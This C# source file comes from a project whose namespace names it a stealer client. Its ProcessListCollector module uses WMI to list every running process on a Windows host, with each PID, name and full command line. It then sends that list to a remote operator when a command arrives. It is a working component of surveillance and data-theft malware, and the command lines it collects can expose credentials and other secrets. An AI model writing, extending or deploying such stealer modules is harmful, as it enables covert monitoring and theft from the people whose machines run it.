using System.Management;
using System.Runtime.Versioning;

namespace Gloom.Client.Features.Stealer.InfoCollector;
internal class ProcessListCollector : FeatureBase
{
	public override Guid[] AcceptedOps => new Guid[] { OpCodes.ProcessListRequest };

	public ProcessListCollector(IMessageSender sender) : base(sender)
	{
	}

	[SupportedOSPlatform("windows")]
	private OpStructs.ProcessEntry[] BuildProcessList()
	{
		if (Environment.OSVersion.Platform != PlatformID.Win32NT)
			return Array.Empty<OpStructs.ProcessEntry>();

		var list = new List<OpStructs.ProcessEntry>();
		var wmi = new ManagementClass("Win32_Process");
		foreach (ManagementBaseObject obj in wmi.GetInstances())
		{
			//https://learn.microsoft.com/ko-kr/windows/win32/cimwin32prov/win32-process
			var entry = new OpStructs.ProcessEntry
			{
				Pid = (uint)obj["ProcessId"],
				Name = (string)obj["Name"],
				CommandLine = (string?)obj["CommandLine"]
			};
			list.Add(entry);
		}
		return list.ToArray();
	}

	public override async Task HandleAsync(Guid op, byte[] data)
	{
		var plist = new OpStructs.ProcessListResponse
		{
			List = BuildProcessList()
		};
		await SendAsync(OpCodes.ProcessListResponse, plist, true);
	}
}
